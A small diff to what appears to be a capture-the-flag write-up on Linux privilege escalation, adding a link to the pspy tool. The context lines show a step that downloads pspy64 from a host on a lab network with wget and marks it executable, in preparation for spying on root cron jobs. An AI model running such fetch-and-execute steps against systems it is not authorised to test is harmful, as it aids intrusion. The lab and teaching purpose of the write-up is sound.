@@ -85,7 +85,7 @@ ps aux
 - `cron` is running as **root**.
 
 ### **Step 2: Spy on Cron Jobs**
-Using `pspy`, a tool for monitoring scheduled jobs:
+Using [`pspy`](https://github.com/DominicBreuker/pspy), a tool for monitoring scheduled jobs:
 ```bash
 wget http://10.8.14.7:8081/pspy64
 chmod +x pspy64
